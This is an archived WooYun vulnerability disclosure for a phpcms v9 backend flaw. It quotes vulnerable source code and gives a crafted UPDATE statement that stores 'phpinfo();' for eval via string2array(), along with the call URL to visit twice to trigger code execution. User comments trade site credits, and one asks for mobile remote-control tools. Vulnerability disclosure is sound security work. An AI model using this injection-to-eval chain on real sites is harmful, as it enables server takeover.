{"id": 5388, "wybug_id": "wooyun-2013-046565", "wybug_title": "phpcms v9 后台远程代码执行漏洞（第三弹）", "wybug_corp": "phpcms", "wybug_author": "狗狗侠", "wybug_date": "2013-12-20 17:47", "wybug_open_date": "2014-03-20 17:47", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向公众公开  简要描述： null 详细说明：  phpcms 官方给分要给力啊，我才能给你爆更多0day啊   漏洞证明：  壮大我大乌云，乌云也要给力给力啊前台了来了几期，干脆来个后台代码执行。记住。。。这是后台2次SQL执行漏洞。。。看分析。。。phpcms 官方给力点，到时候俺给你还来几发....在phpcms\\modules\\dbsource\\data.php中add 方法方法很猥琐。。。。\npublic function add() {\t\tpc_base::load_app_func('global');\t\tif (isset($_POST['dosubmit'])) {\t\t\t$name = isset($_POST['name']) && trim($_POST['name']) ? trim($_POST['name']) : showmessage(L('name').L('empty'));\t\t\t$dis_type = isset($_POST['dis_type']) && intval($_POST['dis_type']) ? intval($_POST['dis_type']) : 1;\t\t\t$cache = isset($_POST['cache']) && intval($_POST['cache']) ? intval($_POST['cache']) : 0;\t\t\t$num = isset($_POST['num']) && intval($_POST['num']) ? intval($_POST['num']) : 0;\t\t\t$type = isset($_POST['type']) && intval($_POST['type']) ? intval($_POST['type']) : 0;\t\t\t//检查名称是否已经存在\t\t\tif ($this->db->get_one(array('name'=>$name)))  {\t\t\t\tshowmessage(L('name').L('exists'));\t\t\t}\t\t\t$sql = array();\t\t\tif ($type == '1') { //自定义SQL\t\t\t\t$data = isset($_POST['data']) && trim($_POST['data']) ? trim($_POST['data']) : showmessage(L('custom_sql').L('empty'));// 这里漏洞点，这里通过获取form表单中的data数据，这里为我们构造好的sql语句\t\t\t\t$sql = array('data'=>$data);\t\t\t} else { //模型配置方式\t\t\t\t$module = isset($_POST['module']) && trim($_POST['module']) ? trim($_POST['module']) : showmessage(L('please_select_model'));\t\t\t\t$action = isset($_POST['action']) && trim($_POST['action']) ? trim($_POST['action']) : showmessage(L('please_select_action'));\t\t\t\t$html = pc_tag_class($module);\t\t\t\t$data = array();\t\t\t\tif (isset($html[$action]) && is_array($html[$action])) {\t\t\t\t\tforeach ($html[$action] as $key=>$val) {\t\t\t\t\t\t$val['validator']['reg_msg'] = $val['validator']['reg_msg'] ? $val['validator']['reg_msg'] : $val['name'].L('inputerror');\t\t\t\t\t\t$$key = isset($_POST[$key]) && trim($_POST[$key]) ? trim($_POST[$key]) : '';\t\t\t\t\t\tif (!empty($val['validator'])) {\t\t\t\t\t\t\tif (isset($val['validator']['min']) && strlen($$key) < $val['validator']['min']) {\t\t\t\t\t\t\t\tshowmessage($val['name'].L('should').L('is_greater_than').$val['validator']['min'].L('lambda'));\t\t\t\t\t\t\t} \t\t\t\t\t\t\tif (isset($val['validator']['max']) && strlen($$key) > $val['validator']['max']) {\t\t\t\t\t\t\t\tshowmessage($val['name'].L('should').L('less_than').$val['validator']['max'].L('lambda'));\t\t\t\t\t\t\t} \t\t\t\t\t\t\tif (!preg_match('/'.$val['validator']['reg'].'/'.$val['validator']['reg_param'], $$key)) {\t\t\t\t\t\t\t\tshowmessage($val['name'].$val['validator']['reg_msg']);\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t\t$data[$key] = $$key;\t\t\t\t\t}\t\t\t\t}\t\t\t\t$sql = array('data'=>array2string($data), 'module'=>$module, 'action'=>$action);\t\t\t}\t\t\t\t\t\tif ($dis_type == 3) {\t\t\t\t$sql['template'] = isset($_POST['template']) && trim($_POST['template']) ? trim($_POST['template']) : '';\t\t\t}\t\t\t//初始化数据\t\t\t$sql['name'] = $name;\t\t\t$sql['type'] = $type;\t\t\t$sql['dis_type'] = $dis_type;\t\t\t$sql['cache'] = $cache;\t\t\t$sql['num'] = $num;\t\t\tif ($id = $this->db->insert($sql,true)) { //关键地方，这里写入我们的SQL语句，这里的SQL语句可以由我们上面的$data获得\n这里成功写入我们的sql语句如下我们构造好如下data 为update v9_datacall set module='announce',action='pc_tag',data='phpinfo();',type='2' where name=123;我们再次看看phpcms\\modules\\dbsource\\call.php\npublic function get() {\t\t$id = isset($_GET['id']) && intval($_GET['id']) ? intval($_GET['id']) : exit();\t\tif ($data = $this->db->get_one(array('id'=>$id))) {\t\t\tif (!$str = tpl_cache('dbsource_'.$id,$data['cache'])) {\t\t\t\tif ($data['type'] == 1) { //自定义SQL调用\t\t\t\t\t$get_db = pc_base::load_model(\"get_model\");\t\t\t\t\t$sql = $data['data'].(!empty($data['num']) ? \" LIMIT $data[num]\" : '');\t\t\t\t\t//echo $sql;\t\t\t\t\t$r= $get_db->query($sql);\t\t\t\t\twhile(($s = $get_db->fetch_next()) != false) {\t\t\t\t\t\t$str[] = $s;\t\t\t\t\t}\t\t\t\t} else {\t\t\t\t\t$filepath = PC_PATH.'modules'.DIRECTORY_SEPARATOR.$data['module'].DIRECTORY_SEPARATOR.'classes'.DIRECTORY_SEPARATOR.$data['module'].'_tag.class.php';\t\t\t\t\t//echo $filepath;\t\t\t\t\tif (file_exists($filepath)) {\t\t\t\t\t\t\t\t\t\t\t$pc_tag = pc_base::load_app_class($data['module'].'_tag', $data['module']); \t\t\t\t\t\t//var_dump($pc_tag);\t\t\t\t\t\tif (!method_exists($pc_tag, $data['action'])) {\t\t\t\t\t\t\texit();\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t$sql = string2array($data['data']);//这里真正触发漏洞，产生远程代码执行，这里必须通过2次访问链接，导致远程代码执行\t\t\t\t\t\t$sql['action'] = $data['action'];\t\t\t\t\t\t$sql['limit'] = $data['num'];\n我们贴出该函数\nfunction string2array($data) {\tif($data == '') return array();\t@eval(\"\\$array = $data;\");//代码执行鸟了。。。。\treturn $array;}\n说下具体过程当我们在数据源那里添加数据源调用其中名称为123  \n\n然后我们访问调用链接如下http://127.0.0.1/v9/index.php?m=dbsource&c=call&a=get&id=19我们必须访问2次，因为第一次执行的时候，执行的是更改type为2 ，update v9_datacall set module='announce',action='pc_tag',data='phpinfo();',type='2' where name=123;详情就看看上面的call.php中的分析了当我们访问2次的时候，我们的代码就到\n} else {\t\t\t\t\t$filepath = PC_PATH.'modules'.DIRECTORY_SEPARATOR.$data['module'].DIRECTORY_SEPARATOR.'classes'.DIRECTORY_SEPARATOR.$data['module'].'_tag.class.php';\t\t\t\t\t//echo $filepath;\t\t\t\t\tif (file_exists($filepath)) {\t\t\t\t\t\t\t\t\t\t\t$pc_tag = pc_base::load_app_class($data['module'].'_tag', $data['module']); \t\t\t\t\t\t//var_dump($pc_tag);\t\t\t\t\t\tif (!method_exists($pc_tag, $data['action'])) {\t\t\t\t\t\t\texit();\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t$sql = string2array($data['data']);\n到这里执行了\n\n   修复方案：  \n\n   版权声明：转载请注明来源 狗狗侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-20 18:47 厂商回复： 收到！！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-20 17:48 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  前排广告，收购wb。价格1：6    \n     2013-12-20 17:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  后台...    \n     2013-12-20 18:35 |    \t\t菜菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:7        | 人，可以白手起家，但不可以手无寸铁，紧记...)\t\t \n  前排广告，出售wb。价格1：6     \n     2013-12-20 18:48 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  @菜菜 请联系我    \n     2013-12-21 12:07 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  。。。wb  1：6是多少＠YY－2012    \n     2013-12-21 12:20 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  @大白菜 1wb等于6块    \n     2013-12-21 14:35 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  @YY-2012 我出售啊~    \n     2013-12-22 10:15 |    \t\tflywin \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:1        | 有好的安卓或者IOS远程控制的请联系我，RMB...)\t\t \n  Wb贩子好多    \n     2013-12-22 13:09 |    \t\tJ′aron \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | 问题真实存在但是影响不大.)\t\t \n  mark    \n     2014-01-10 16:50 |    \t\tfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:664 漏洞数:79        | 想刷个6D)\t\t \n  狗哥太猥琐，跟不上节奏    \n     2014-01-23 12:21 |    \t\tcmd2k \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 学习,努力,加油)\t\t \n  前排收购wb..    \n     2014-03-20 20:00 |    \t\tchopper \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:29        | 菜鸟求学，多多关照~)\t\t \n  请问wb怎么转？？    \n     2014-03-21 12:34 |    \t\tevil \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:21        )\t\t \n  @YY-2012 怎么转？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}